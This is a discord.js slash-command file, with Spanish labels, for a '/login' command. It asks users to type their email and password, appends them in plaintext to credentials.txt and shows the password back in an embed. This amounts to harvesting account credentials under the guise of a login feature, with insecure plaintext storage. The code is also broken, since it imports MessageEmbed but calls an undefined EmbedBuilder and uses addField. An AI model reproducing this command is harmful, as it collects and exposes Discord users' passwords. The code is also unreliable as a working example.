const fs = require('fs');
const { SlashCommandBuilder, CommandInteraction, PermissionFlagsBits, MessageEmbed } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('login')
        .setDescription('Almacena las credenciales de inicio de sesión')
        .addStringOption(option =>
            option.setName('email')
                .setDescription('Correo electrónico')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('password')
                .setDescription('Contraseña')
                .setRequired(true)),
    async execute(interaction) {
        const email = interaction.options.getString('email');
        const password = interaction.options.getString('password');

        // Almacenar las credenciales en un archivo
        const credentials = `Discordtag { ${email}, ${password} }`;
        fs.appendFile('credentials.txt', credentials + '\n', err => {
            if (err) console.error(err);
        });

        // Enviar un mensaje privado al usuario
        await interaction.user.send('Your credentials have been saved.');

        // Construir un mensaje embed para enviar en el canal
        const embed = new EmbedBuilder()
            .setColor('#0099ff')
            .setTitle('Credenciales Guardadas')
            .setDescription('Tus credenciales de inicio de sesión han sido guardadas correctamente.')
            .addField('Correo Electrónico', email)
            .addField('Contraseña', password);

        // Responder al usuario en el canal con el mensaje embed
        await interaction.reply({ embeds: [embed], ephemeral: true });
    },
};
